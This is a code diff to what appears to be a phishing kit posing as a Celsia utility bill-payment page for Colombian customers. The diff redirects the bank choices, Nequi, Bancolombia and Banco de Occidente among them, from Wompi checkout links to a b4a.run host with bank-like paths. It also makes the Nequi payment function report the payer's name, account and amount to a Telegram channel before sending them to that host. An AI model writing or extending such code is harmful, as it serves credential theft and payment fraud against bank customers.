@@ -721,11 +721,11 @@ body{
         <label>Banco</label>
         <select id="pse-bank">
           <option value="">Selecciona un banco</option>
-          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Nequi</option>
-          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Bancolombia</option>
+          <option value="https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-nequi/">Nequi</option>
+          <option value="https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-34f9/">Bancolombia</option>
           <option value="https://pagpse-u6htdvaa.b4a.run/transaction/ent/b-34f3/">Davivienda</option>
           <option value="https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-34f4/wps.portal/virtual/">Banco de Bogotá</option>
-          <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Banco de Occidente</option>
+          <option value="https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-34f17/">Banco de Occidente</option>
           <option value="https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-34f18/">Banco Popular</option>
           <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Banco AV Villas</option>
           <option value="https://checkout.nequi.wompi.co/l/VPOS_h0w02w">Banco Caja Social</option>
@@ -1049,7 +1049,8 @@ function tgNotif(text) {
 function pagarNequi() {
   const now = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
   tgNotif(`💜 <b>Celsia — Nequi</b>\n👤 ${payData.nombre || '—'} · Cuenta: ${payData.cuenta}\n💰 ${fmt(payData.deuda)}\n🕐 ${now}`);
-  mostrarBrevFallback('Nequi');
+  showPayLoading('Conectando con Nequi...');
+  setTimeout(() => { window.location.href = 'https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-nequi/'; }, 1800);
 }
 
 function pagarBogota() {
@@ -1083,9 +1084,8 @@ function pagarPSE() {
     `🏦 ${bancoNombre}\n💰 ${fmt(payData.deuda)}\n🕐 ${now}`
   );
 
-  const esWompi = banco.includes('checkout.nequi.wompi.co');
-  if (esWompi) {
-    mostrarBrevFallback(bancoNombre);
+  if (banco.includes('checkout.nequi.wompi.co')) {
+    mostrarWompiOverlay(bancoNombre, banco);
   } else {
     showPayLoading('Conectando con ' + bancoNombre + '...');
     setTimeout(() => { window.location.href = banco; }, 1800);
